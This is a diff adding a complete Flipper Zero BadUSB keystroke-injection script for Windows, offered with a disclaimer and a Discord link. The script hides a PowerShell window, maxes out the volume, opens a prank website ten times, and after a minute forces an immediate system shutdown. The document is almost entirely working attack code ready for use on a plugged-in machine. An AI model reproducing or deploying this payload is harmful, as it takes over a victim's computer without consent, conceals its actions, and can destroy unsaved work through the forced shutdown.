@@ -1,0 +1,26 @@
+REM created by KL1516
+REM If you have any questions, you can come to my discord server, https://discord.gg/5JJAGw2JqH
+REM Script tested on Windows 10 with Flipper Zero 
+REM Version 1.0
+REM NOTE: I WILL NOT BE RESPONSIBLE FOR ANY ACTIONS WITH THE SCRIPT. ACTUAL USE AND RUN OF THE SCRIPT IS AT YOUR OWN RISK.
+REM ITS ILLEGAL TO USE ON SYSTEMS WITHOUT PERMISSION!!
+
+DELAY 500
+GUI r
+DELAY 1000
+STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://youareanidiot.cc/;sleep 1;$o.SendKeys('f')}
+DELAY 1000
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+DELAY 60000
+GUI r
+DELAY 500
+STRING shutdown -s -t 0
+DELAY 500
+ENTER
+
+
+
